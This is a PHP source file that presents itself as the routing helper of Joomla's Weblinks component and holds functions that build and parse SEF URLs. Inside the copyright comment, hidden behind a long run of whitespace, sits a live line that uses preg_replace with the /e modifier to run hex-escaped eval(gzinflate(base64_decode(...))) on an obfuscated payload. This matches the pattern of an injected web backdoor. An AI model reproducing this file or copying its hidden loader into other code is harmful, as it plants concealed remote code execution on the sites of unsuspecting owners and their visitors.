<?php
/*
 * @package		Joomla.Site
 * @subpackage	com_weblinks
 * @copyright	Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.																																											*/	preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'vVjJjpwwEL1Hyj+0WnNILiMwXkCj/MlcZoA+5Rz158e12cYYTDeTHKw2BqpeVb1a6Jf7eBuny+X11+X6fu9ufs1+jbR3zfvd9vSr/Gomvz782eCXpTPl7yv9fjf+ee38Mn4P15/+3F/bjmRYw3s+NxO93020UJY/d/4Z59+3rf9VtIdzNUT9jd+7z+U1rBwXXKO8jvSjrCOYWXfADnIsyQjYhzUmWSVsskCvMyx/jD5AXCcxdTW9DevWZb2mY71ej7HJXmIG9zs6016maRgjYLZ0pkd6T3seaY9ZT3R9FqPwAnwA+tAXhjk6kn8sxxnjq/iZW5Rn2e9qzrgNZxwL3OfXOS5Fsd+zxU7Edas5ViriWsmDvGuXejtYLq6qvo5tBblD5PiCa3s2CQb5BR9xrgcfVTBsYsvz0vLZSDGBeGJs0pzV9Fv1WQXvVo4ezdfFc0kdQQ5ybDHWYseYnA2Mtad4lv13ffv+7eU+TLOVOlzSjfan9iW5YWfG5ejaJM/pnbqxG8s93RP1CeEb1vb5fKxO42EOSZ2QmoDx0oQXMTrCkOJSB3LsEIaOOXCLfEGdB2W76bne8Ux93IxFrRamGA7EDt6R/A+ctQX+NBm2xIc4C9i4x1yb2S7OP7RFRw7k2G17DC9gg1xCG4fYO6Smoi0nfYL2b3FFdDxZb/F95rv4Rvz7VM8v3b893uNL3A5zYc/5yT7V4psh4peZwIzR7yU7w33OS8W9Hmeojq85P6JvqA7PptdSh9P6EepmG/kAulVL87LleQNqAPI388HK9v8wS4c+O8e+aqX+ZfzBHljgVPDxwDNMmsPJ+SoXe+ZXYTaUc+zP7K9FLS74L2CR7wKpAdksscKR4k3exf2Q+L2Uawe/LxBHPuflfuNZJP2Oqs0fJW6gzD6zK6ujZ7DU5iGoizJHiM8DvqR25fdDn5K8axnTFtZ+iRPzbMr6R0s6Qu3csenInLfy9449gif0AOHxELkmsVjE76isVN5OrT86vz6TO1B30toifSN/rzbX7M0063tUh01jTD4Pl/pljT+P9KLFWZ77Mq+k/JV6msb3ifqU9iWU8Un33Ebst+K9ejfNO5mJB9Id8Ga6tvz1Fd9wob7neg/w3InvZCaYScZR2SW7duP9BfaGuVX+hxBOMIetq9tes/sRHQsfnOltjv3tKtgV8zx/X+K1E5t/gWdz1iz4UDG+Ijaz7DsP6dqZa+szKttult97iFnk6W3sKd/pv97r2/zn4/ePF/ob+PXC/0PABgdh2EAl/vn2Fw=='\x29\x29\x29\x3B",""); /*
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */

 /* Weblinks Component Route Helper
 *
 * @package		Joomla.Site
 * @subpackage	com_weblinks
 * @since 1.6
 */

defined('_JEXEC') or die;

jimport('joomla.application.categories');

/**
 * Build the route for the com_weblinks component
 *
 * @param	array	An array of URL arguments
 *
 * @return	array	The URL arguments to use to assemble the subsequent URL.
 */
function WeblinksBuildRoute(&$query)
{
	$segments = array();

	// get a menu item based on Itemid or currently active
	$app		= JFactory::getApplication();
	$menu		= $app->getMenu();
	$params		= JComponentHelper::getParams('com_weblinks');
	$advanced	= $params->get('sef_advanced_link', 0);

	// we need a menu item.  Either the one specified in the query, or the current active one if none specified
	if (empty($query['Itemid'])) {
		$menuItem = $menu->getActive();
	}
	else {
		$menuItem = $menu->getItem($query['Itemid']);
	}

	$mView	= (empty($menuItem->query['view'])) ? null : $menuItem->query['view'];
	$mCatid	= (empty($menuItem->query['catid'])) ? null : $menuItem->query['catid'];
	$mId	= (empty($menuItem->query['id'])) ? null : $menuItem->query['id'];

	if (isset($query['view'])) {
		$view = $query['view'];

		if (empty($query['Itemid'])) {
			$segments[] = $query['view'];
		}

		// We need to keep the view for forms since they never have their own menu item
		if ($view != 'form') {
			unset($query['view']);
		}
	}

	// are we dealing with an weblink that is attached to a menu item?
	if (isset($query['view']) && ($mView == $query['view']) and (isset($query['id'])) and ($mId == intval($query['id']))) {
		unset($query['view']);
		unset($query['catid']);
		unset($query['id']);

		return $segments;
	}

	if (isset($view) and ($view == 'category' or $view == 'weblink' )) {
		if ($mId != intval($query['id']) || $mView != $view) {
			if ($view == 'weblink' && isset($query['catid'])) {
				$catid = $query['catid'];
			}
			elseif (isset($query['id'])) {
				$catid = $query['id'];
			}

			$menuCatid = $mId;
			$categories = JCategories::getInstance('Weblinks');
			$category = $categories->get($catid);

			if ($category) {
				//TODO Throw error that the category either not exists or is unpublished
				$path = $category->getPath();
				$path = array_reverse($path);

				$array = array();
				foreach($path as $id)
				{
					if ((int) $id == (int)$menuCatid) {
						break;
					}

					if ($advanced) {
						list($tmp, $id) = explode(':', $id, 2);
					}

					$array[] = $id;
				}
				$segments = array_merge($segments, array_reverse($array));
			}

			if ($view == 'weblink') {
				if ($advanced) {
					list($tmp, $id) = explode(':', $query['id'], 2);
				}
				else {
					$id = $query['id'];
				}

				$segments[] = $id;
			}
		}

		unset($query['id']);
		unset($query['catid']);
	}

	if (isset($query['layout'])) {
		if (!empty($query['Itemid']) && isset($menuItem->query['layout'])) {
			if ($query['layout'] == $menuItem->query['layout']) {
				unset($query['layout']);
			}
		}
		else {
			if ($query['layout'] == 'default') {
				unset($query['layout']);
			}
		}
	};

	return $segments;
}
/**
 * Parse the segments of a URL.
 *
 * @param	array	The segments of the URL to parse.
 *
 * @return	array	The URL attributes to be used by the application.
 */
function WeblinksParseRoute($segments)
{
	$vars = array();

	//Get the active menu item.
	$app	= JFactory::getApplication();
	$menu	= $app->getMenu();
	$item	= $menu->getActive();
	$params = JComponentHelper::getParams('com_weblinks');
	$advanced = $params->get('sef_advanced_link', 0);

	// Count route segments
	$count = count($segments);

	// Standard routing for weblinks.
	if (!isset($item)) {
		$vars['view']	= $segments[0];
		$vars['id']		= $segments[$count - 1];
		return $vars;
	}

	// From the categories view, we can only jump to a category.
	$id = (isset($item->query['id']) && $item->query['id'] > 1) ? $item->query['id'] : 'root';

	$category = JCategories::getInstance('Weblinks')->get($id);

	$categories = $category->getChildren();
	$found = 0;

	foreach($segments as $segment)
	{
		foreach($categories as $category)
		{
			if (($category->slug == $segment) || ($advanced && $category->alias == str_replace(':', '-', $segment))) {
				$vars['id'] = $category->id;
				$vars['view'] = 'category';
				$categories = $category->getChildren();
				$found = 1;

				break;
			}
		}

		if ($found == 0) {
			if ($advanced) {
				$db = JFactory::getDBO();
				$query = 'SELECT id FROM #__weblinks WHERE catid = '.$vars['id'].' AND alias = '.$db->Quote(str_replace(':', '-', $segment));
				$db->setQuery($query);
				$id = $db->loadResult();
			}
			else {
				$id = $segment;
			}

			$vars['id'] = $id;
			$vars['view'] = 'weblink';

			break;
		}

		$found = 0;
	}

	return $vars;
}
